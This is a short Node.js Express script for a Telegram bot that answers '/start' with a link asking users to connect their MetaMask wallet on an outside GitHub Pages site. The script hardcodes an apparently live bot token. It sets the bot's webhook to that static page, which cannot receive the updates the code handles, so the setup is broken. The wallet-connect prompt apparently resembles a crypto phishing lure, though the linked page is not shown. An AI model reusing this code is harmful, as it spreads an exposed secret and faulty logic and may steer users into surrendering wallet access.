const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;
const TELEGRAM_TOKEN = '6549070771:AAGmJMkRK7zCfejSv5hhfMyy7LzhZduOdsA'; 
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`; 

app.use(bodyParser.json());

app.post('/webhook', async (req, res) => {
    const { message } = req.body;
    if (message && message.text) {
        const chatId = message.chat.id;
        const text = message.text.toLowerCase();
        
        if (text === '/start') {
            await sendMessage(chatId, 'Welcome! Connect your MetaMask wallet here: [Connect MetaMask](https://mors6960.github.io/Metamask-Telegram-Wallet/)');
        }
    }
    res.sendStatus(200);
});

const sendMessage = async (chatId, text) => {
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'Markdown'
        });
    } catch (error) {
        console.error('Error sending message:', error.response ? error.response.data : error.message);
    }
};

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    setWebhook();
});

const setWebhook = async () => {
    const url = 'https://mors6960.github.io/Metamask-Telegram-Wallet/'; 
    try {
        const response = await axios.post(`${TELEGRAM_API}/setWebhook`, { url });
        console.log('Webhook set', response.data);
    } catch (error) {
        console.error('Error setting webhook:', error.response ? error.response.data : error.message);
    }
};
